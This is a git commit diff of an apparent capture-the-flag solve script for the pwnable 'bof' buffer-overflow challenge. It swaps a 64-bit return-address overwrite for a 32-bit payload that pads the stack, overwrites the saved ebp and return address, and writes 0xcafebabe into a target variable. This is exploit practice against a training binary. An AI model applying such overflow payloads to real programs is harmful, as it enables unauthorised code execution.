271218d94b171671ba69954984e74b9a5672366b
guy's ubuntu 32 bit machine <guykrinsky9@gmail.com>
2022-11-10 04:32:47 -0800

    fixed 32 bit problems

--- pwnable/bof/solve.py
+++ pwnable/bof/solve.py
@@ -1,7 +1,12 @@
-shell_address = 0x0000555555555215
 
-payload = b"a" * 0x38
-payload += (shell_address).to_bytes(8,"little")
+#overide all the things 
+payload = b"a" * 0x2c
+#overide ebp
+payload +=b"b" * 4
+#overide return address
+payload += b"c" * 4
+
+payload += (0xcafebabe).to_bytes(4,"little")
 payload += b"\n"
 with open("input", "wb") as output_file:
     output_file.write(payload)
